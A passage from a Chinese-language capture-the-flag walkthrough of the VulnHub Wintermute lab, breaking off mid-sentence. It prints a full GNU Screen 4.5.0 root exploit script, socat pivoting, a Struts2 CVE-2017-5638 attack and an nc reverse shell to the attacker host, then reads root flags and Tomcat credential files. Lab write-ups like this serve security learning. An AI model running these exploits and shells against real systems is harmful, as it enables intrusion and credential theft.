<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看是否有可提权的SUID文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/bin/ping</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure>

<p>在screen-4.5.0上运行searchsploit将返回漏洞，以提升权限，完美！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5</span></span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                |  Path</span><br><span class="line">                                                              | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation                 | exploits/linux/<span class="built_in">local</span>/41154.sh</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)           | exploits/linux/<span class="built_in">local</span>/41152.txt</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

<p>看一下exp的源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/linux/local/41154.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshellr</span><br></pre></td></tr></table></figure>

<p>运行以下sed命令将脚本格式换行和缩进转化一下，脚本才能正常运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/41154<span class="comment"># sed -i -e &#x27;s/\r$//&#x27; 41154.sh</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/41154<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>转换为tty标准的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p>如下成功运行脚本，成功提权，帅爆了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@straylight:/var/www/html/turing-bolo$ wget http://192.168.56.102:8000/41154.sh</span><br><span class="line">&lt;ring-bolo$ wget http://192.168.56.102:8000/41154.sh</span><br><span class="line">--2020-01-15 01:30:12--  http://192.168.56.102:8000/41154.sh</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1151 (1.1K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;41154.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">41154.sh            100%[===================&gt;]   1.12K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-15 01:30:12 (415 MB/s) - <span class="string">&#x27;41154.sh&#x27;</span> saved [1151/1151]</span><br><span class="line"></span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ ls</span><br><span class="line">ls</span><br><span class="line">41154.sh      bolo.css  c7.png    css         molly.log    ta.png</span><br><span class="line">armitage.log  bolo.php  case.log  index.html  riviera.log</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ ./41154.sh</span><br><span class="line">./41154.sh</span><br><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">/tmp/libhax.c: In <span class="keyword">function</span> <span class="string">&#x27;dropshell&#x27;</span>:</span><br><span class="line">/tmp/libhax.c:7:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;chmod&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">     ^~~~~</span><br><span class="line">/tmp/rootshell.c: In <span class="keyword">function</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">/tmp/rootshell.c:3:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setuid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setuid(0);</span><br><span class="line">     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:4:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setgid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setgid(0);</span><br><span class="line">     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:5:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;seteuid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     seteuid(0);</span><br><span class="line">     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:6:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;setegid&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     setegid(0);</span><br><span class="line">     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:7:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;execvp&#x27;</span> [-Wimplicit-function-declaration]</span><br><span class="line">     execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">     ^~~~~~</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">No Sockets found in /tmp/screens/S-www-data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt  note.txt  scripts</span><br><span class="line"><span class="comment"># cat note.txt</span></span><br><span class="line">cat note.txt</span><br><span class="line">Devs,</span><br><span class="line"></span><br><span class="line">Lady 3Jane has asked us to create a custom java app on Neuromancer<span class="string">&#x27;s primary server to help her interact w/ the AI via a web-based GUI.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The engineering team couldn&#x27;</span>t strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can <span class="keyword">do</span>.</span><br><span class="line"></span><br><span class="line">Anyways, we<span class="string">&#x27;ve deployed the war file on tomcat as ordered - located here:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/struts2_2.3.15.1-showcase</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;</span>s ready <span class="keyword">for</span> the devs to customize to her liking...I<span class="string">&#x27;m stating the obvious, but make sure to secure this thing.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Bob Laugh</span></span><br><span class="line"><span class="string">Turing Systems Engineer II</span></span><br><span class="line"><span class="string">Freeside//Straylight//Ops5</span></span><br><span class="line"><span class="string"># cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string">5ed185fd75a8d6a7056c96a436c6d8aa</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub164.jpg"></p>
<p>winterMute第一部分到此结束</p>
<ul>
<li>总结：</li>
</ul>
<p> 1.弱口令<br> 2.文件包含<br> 3.telnet发送恶意邮件写shell<br> 4.python reverse shell<br> 5.Screen 4.5.0本地提权<br> 6.用(sed -i -e ‘s/\r$//‘)将exp换行和缩进和格式变得可执行</p>
<h4 id="Wintermute-Neuromancer"><a href="#Wintermute-Neuromancer" class="headerlink" title="Wintermute-Neuromancer"></a>Wintermute-Neuromancer</h4><p>之前的note.txt向显示一个可能的网络目录。但是，当不知道Neuromancer上的哪些端口打开时，这是没有用的。查看Straylight的arp表将告诉我们Neuromancer的地址，即192.168.56.110。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># arp -a</span></span><br><span class="line">arp -a</span><br><span class="line">? (192.168.56.102) at 00:0c:29:70:75:41 [ether] on enp0s8</span><br><span class="line">? (192.168.56.110) at 08:00:27:de:b9:3d [ether] on enp0s8</span><br><span class="line">? (192.168.56.1) at 0a:00:27:00:00:19 [ether] on enp0s8</span><br><span class="line">? (192.168.56.100) at 08:00:27:25:3d:8a [ether] on enp0s8</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ifconfig</span></span><br><span class="line">ifconfig</span><br><span class="line">enp0s3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.111  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::a00:27ff:fe50:96d9  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 08:00:27:50:96:d9  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 771  bytes 65226 (63.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 21  bytes 2052 (2.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">enp0s8: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.109  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::a00:27ff:fea9:7af0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 08:00:27:a9:7a:f0  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 197671  bytes 11899335 (11.3 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 197077  bytes 14611455 (13.9 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 415522  bytes 33365253 (31.8 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 415522  bytes 33365253 (31.8 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>也可以写一个脚本探测存活的主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> $(seq 1 254); <span class="keyword">do</span></span><br><span class="line">   ping -c 1 192.168.56.<span class="variable">$ip</span> | grep <span class="string">&quot;bytes from&quot;</span> | cut -d <span class="string">&quot; &quot;</span> -f 4 | cut -d <span class="string">&quot;:&quot;</span> -f 1 &amp;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./pingsweep.sh</span></span><br><span class="line">./pingsweep.sh</span><br><span class="line">192.168.56.100</span><br><span class="line">192.168.56.102</span><br><span class="line">192.168.56.111</span><br><span class="line">192.168.56.110</span><br><span class="line">192.168.56.109</span><br></pre></td></tr></table></figure>

<p>其中192.168.56.102是kali的ip，192.168.56.109，和192.168.56.111都是Straylight的ip，192.168.56.100是vbox Host-only Adapter网卡的网关地址，剩下的192.168.56.110就是Neuromancer机器的ip地址。</p>
<p>使用nc扫描端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.110 $i 2&gt;&amp;1; done | grep -v &quot;Connection refused&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq 1 65535); <span class="keyword">do</span> nc -nvz -w 1 192.168.56.110 <span class="variable">$i</span> 2&gt;&amp;1; <span class="keyword">done</span> | grep -v <span class="string">&quot;Connection refused&quot;</span></span><br><span class="line">(UNKNOWN) [192.168.56.110] 8009 (?) open</span><br><span class="line">(UNKNOWN) [192.168.56.110] 8080 (http-alt) open</span><br><span class="line">(UNKNOWN) [192.168.56.110] 34483 (?) open</span><br></pre></td></tr></table></figure>

<p>这里有三个开放的端口8009、8080和34483，但是问题是，如果尝试访问IP和端口，将看不到任何内容。为了能够加入它们，必须进行端口转发。对于端口转发，可以使用socat之类的socat，如socat TCP-LISTEN：5000,fork,reuseaddr tcp：127.0.0.1：8080，这意味着8080上的网站应该在外部的5000端口上可见。但是，由于需要处理三个端口，必须在每个命令的末尾加上＆。＆in nix告诉系统执行命令并将其置于后台。简而言之，将执行以下命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.110:8009 &amp;</span></span><br><span class="line">socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.110:8009 &amp;</span><br><span class="line"><span class="comment"># socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.110:8080 &amp;</span></span><br><span class="line">socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.110:8080 &amp;</span><br><span class="line"><span class="comment"># socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.110:34483 &amp;</span></span><br><span class="line">socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.110:34483 &amp;</span><br></pre></td></tr></table></figure>

<p>然后上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p 8009,8080,34483 -Pn -A --script=vuln 192.168.56.110</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8080/tcp  open  http    Apache Tomcat 9.0.0.M26</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /examples/: Sample scripts</span><br><span class="line">|   /manager/html/upload: Apache Tomcat (401 )</span><br><span class="line">|   /manager/html: Apache Tomcat (401 )</span><br><span class="line">|_  /docs/: Potentially interesting folder</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">34483/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>然后访问之前note.txt中提到的url</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub165.jpg"></p>
<p>Apache struts有一些已知的漏洞利用。当使用searchsploit搜索“apache struts”时，可以看到许多可能的利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit apache struts</span></span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                  |  Path                                  </span><br><span class="line">                                                                                                | (/usr/share/exploitdb/)                </span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Apache Struts - <span class="string">&#x27;ParametersInterceptor&#x27;</span> Remote Code Execution (Metasploit)                      | exploits/multiple/remote/24874.rb</span><br><span class="line">Apache Struts - ClassLoader Manipulation Remote Code Execution (Metasploit)                     | exploits/multiple/remote/33142.rb</span><br><span class="line">Apache Struts - Developer Mode OGNL Execution (Metasploit)                                      | exploits/java/remote/31434.rb</span><br><span class="line">Apache Struts - Dynamic Method Invocation Remote Code Execution (Metasploit)                    | exploits/linux/remote/39756.rb</span><br><span class="line">Apache Struts - Multiple Persistent Cross-Site Scripting Vulnerabilities                        | exploits/multiple/webapps/18452.txt</span><br><span class="line">Apache Struts - OGNL Expression Injection                                                       | exploits/multiple/remote/38549.txt</span><br><span class="line">Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution                | exploits/multiple/remote/43382.py</span><br><span class="line">Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution (Metasploit)   | exploits/multiple/remote/39919.rb</span><br><span class="line">Apache Struts - includeParams Remote Code Execution (Metasploit)                                | exploits/multiple/remote/25980.rb</span><br><span class="line">Apache Struts 1.2.7 - Error Response Cross-Site Scripting                                       | exploits/multiple/remote/26542.txt</span><br><span class="line">Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                 | exploits/multiple/remote/27135.rb</span><br><span class="line">Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)                                | exploits/multiple/remote/45367.rb</span><br><span class="line">Apache Struts 2 - Skill Name Remote Code Execution                                              | exploits/multiple/remote/37647.txt</span><br><span class="line">Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasploit)                     | exploits/multiple/remote/44643.rb</span><br><span class="line">Apache Struts 2 &lt; 2.3.1 - Multiple Vulnerabilities                                              | exploits/multiple/webapps/18329.txt</span><br><span class="line">Apache Struts 2.0 - <span class="string">&#x27;XSLTResult.java&#x27;</span> Arbitrary File Upload                                     | exploits/java/webapps/37009.xml</span><br><span class="line">Apache Struts 2.0.0 &lt; 2.2.1.1 - XWork <span class="string">&#x27;s:submit&#x27;</span> HTML Tag Cross-Site Scripting                  | exploits/multiple/remote/35735.txt</span><br><span class="line">Apache Struts 2.0.1 &lt; 2.3.33 / 2.5 &lt; 2.5.10 - Arbitrary Code Execution                          | exploits/multiple/remote/44556.py</span><br><span class="line">Apache Struts 2.0.9/2.1.8 - Session Tampering Security Bypass                                   | exploits/multiple/remote/36426.txt</span><br><span class="line">Apache Struts 2.2.1.1 - Remote Command Execution (Metasploit)                                   | exploits/multiple/remote/18984.rb</span><br><span class="line">Apache Struts 2.2.3 - Multiple Open Redirections                                                | exploits/multiple/remote/38666.txt</span><br><span class="line">Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution (1)                           | exploits/linux/remote/45260.py</span><br><span class="line">Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution (2)                           | exploits/multiple/remote/45262.py</span><br><span class="line">Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - <span class="string">&#x27;Jakarta&#x27;</span> Multipart Parser OGNL Injection (Metasp | exploits/multiple/remote/41614.rb</span><br><span class="line">Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - Remote Code Execution                             | exploits/linux/webapps/41570.py</span><br><span class="line">Apache Struts 2.3.x Showcase - Remote Code Execution                                            | exploits/multiple/webapps/42324.py</span><br><span class="line">Apache Struts 2.5 &lt; 2.5.12 - REST Plugin XStream Remote Code Execution                          | exploits/linux/remote/42627.py</span><br><span class="line">Apache Struts &lt; 1.3.10 / &lt; 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploi | exploits/multiple/remote/41690.rb</span><br><span class="line">Apache Struts &lt; 2.2.0 - Remote Command Execution (Metasploit)                                   | exploits/multiple/remote/17691.rb</span><br><span class="line">Apache Struts2 2.0.0 &lt; 2.3.15 - Prefixed Parameters OGNL Injection                              | exploits/multiple/webapps/44583.txt</span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>从github上面clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hemVuMTYwL3N0cnV0cy1wd24=">struts-pwn项目<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python3 struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action --check</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] Status: Vulnerable!</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>
<p>表示存在CVE:2017-5638 - Apache Struts2 S2-045漏洞</p>
<h3 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h3><p>然后运行下面命令获得一个revese shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python3 struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action -c &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f&quot;</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] CMD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f</span><br><span class="line">EXCEPTION::::--&gt; HTTPConnectionPool(host=<span class="string">&#x27;192.168.56.110&#x27;</span>, port=8080): Read timed out. (<span class="built_in">read</span> timeout=3)</span><br><span class="line">ERROR</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>

<p>nc命令获得可交互的shell:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p>成功的弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9999</span></span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">192.168.56.110: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.110] 55378</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">ta</span></span><br></pre></td></tr></table></figure>

<p>获得了Neuromancer的权限！检查“ta”用户的home目录将显示一些有趣的内容。此注释将显示tomcat目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat ai-gui-guide.txt</span><br><span class="line">Application <span class="keyword">for</span> Neuromancer remote access interface includes:</span><br><span class="line"></span><br><span class="line">-Maven    - /opt/</span><br><span class="line">-Java jdk - /usr/lib/jvm/</span><br><span class="line">-Tomcat   - /usr/<span class="built_in">local</span>/tomcat/</span><br><span class="line">-Struts2  - /home/ta/myWebApp/</span><br><span class="line">          - war files are <span class="keyword">in</span> /root. Update these ASAP to improve security.</span><br><span class="line"></span><br><span class="line">Reduce installation of apps to ONLY what<span class="string">&#x27;s needed, seucure configurations and follow app security best practices.</span></span><br></pre></td></tr></table></figure>

<p>Tomcat将用户和密码存储在名为“tomcat-users.xml”的文件中。读取该文件将显示系统上另一个用户“lady3jane”的密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat tomcat-users.xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">Eng.,</span><br><span class="line"></span><br><span class="line">Tomcat is still using basic auth. I encoded the password so the AI<span class="string">&#x27;s security scans don&#x27;</span>t flag it.</span><br><span class="line"></span><br><span class="line">Is this what Bob keeps talking about, <span class="string">&quot;Security by 